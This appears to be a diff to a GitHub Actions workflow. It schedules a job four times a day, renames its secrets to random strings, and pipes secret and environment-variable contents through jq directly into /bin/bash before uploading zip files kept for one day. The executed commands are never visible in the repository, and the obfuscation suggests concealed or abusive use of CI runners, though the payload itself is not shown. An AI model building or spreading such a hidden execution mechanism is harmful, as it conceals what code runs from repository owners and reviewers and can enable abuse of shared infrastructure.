@@ -2,6 +2,8 @@ name: Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '59 1,7,13,19 * * *'
 permissions:
   contents: read
 concurrency:
@@ -14,16 +16,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: Process
         env:
-          nx67: ${{ secrets.nx67 }}
+          et62: ${{ secrets.et62 }}
         run: |
-          printf '%s' "$nx67" | jq -r .bfavd38684 | /bin/bash
-          printf '%s' "$yyog159" | jq -r .j4251 | /bin/bash
-          printf '%s' "$vrs060" | jq -r .csmrp1 | /bin/bash
-          echo $mbu89482 | jq -r .l4 | /bin/bash
+          printf '%s' "$et62" | jq -r .in1 | /bin/bash
+          printf '%s' "$f510" | jq -r .gje4053 | /bin/bash
+          echo $dpmwm80240 | jq -r .av8 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
         with:
-          name: 5F3YGpJq
+          name: bYO0nvEJ
           path: "*.zip"
           retention-days: 1
